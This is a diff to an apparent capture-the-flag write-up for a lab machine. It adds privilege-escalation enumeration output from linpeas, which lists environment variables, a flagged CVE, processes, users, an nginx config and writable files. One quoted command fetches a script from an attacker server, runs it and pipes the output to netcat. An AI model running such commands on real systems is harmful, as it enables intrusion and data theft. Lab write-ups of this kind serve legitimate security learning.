@@ -295,3 +295,60 @@ Once that's done, we download linpeas on the box from the attacker web server an
 ```
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
 ```
+
+```
+╔══════════╣ Environment
+╚ Any private information inside environment variables?
+USER=app
+HOME=/home/app
+TF2_BEHAVIOR=1
+TPU_ML_PLATFORM=Tensorflow
+LOGNAME=app
+SERVER_SOFTWARE=gunicorn/20.0.4
+LANG=en_US.UTF-8
+SHELL=/bin/bash
+PWD=/home/app/app
+
+╔══════════╣ Executing Linux Exploit Suggester
+Vulnerable to CVE-2021-3560
+
+app          810  0.0  0.6  31588 24188 ?        Ss   02:11   0:13 /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+app        77534  0.2 10.7 874108 428484 ?       Sl   19:26   0:04  _ /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+app       102689  0.2 10.7 874092 428492 ?       Sl   19:28   0:03  _ /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+app       133666  1.6 10.7 874096 428968 ?       Sl   19:49   0:03  _ /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+app       167302 10.0 10.7 873028 427016 ?       Sl   19:52   0:03  _ /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+
+╔══════════╣ All users & groups
+uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
+
+╔══════════╣ Last Logons and Login History
+gael     pts/0        10.10.14.4       Fri Aug 15 13:48   still logged in
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    if ($host != artificial.htb) {
+        rewrite ^ http://artificial.htb/;
+    }
+    server_name artificial.htb;
+        access_log /var/log/nginx/application.access.log;
+        error_log /var/log/nginx/appliation.error.log;
+        location / {
+                include proxy_params;
+                proxy_pass http://127.0.0.1:5000;
+        }
+}
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+/opt/backrest/backrest
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 12
+drwxr-xr-x  5 root root 4096 Aug 15 19:30 backrest
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
+```
